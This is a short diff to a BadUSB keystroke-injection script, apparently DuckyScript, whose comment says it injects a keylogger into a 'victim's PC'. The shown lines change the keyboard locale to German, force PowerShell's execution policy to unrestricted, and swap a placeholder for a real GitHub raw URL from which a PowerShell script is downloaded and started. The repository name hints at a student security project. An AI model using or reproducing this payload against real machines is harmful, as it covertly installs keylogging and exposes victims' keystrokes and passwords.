@@ -1,5 +1,5 @@
 REM This script allows you to inject a software keylogger in victim's PC
-LOCALE FR
+LOCALE DE
 DELAY 2500
 REM Minimize all app
 GUI d
@@ -25,7 +25,7 @@ REM Disable script blocker
 STRING Set-ExecutionPolicy unrestricted -Force
 ENTER
 REM Download ps1 script
-STRING wget LINK -OutFile startScript.ps1
+STRING wget https://raw.githubusercontent.com/JustusKapst/it-security_projekt1/refs/heads/main/GithubKeylogger/startScript.ps1 -OutFile startScript.ps1
 ENTER
 DELAY 3500
 REM Start ps1 script
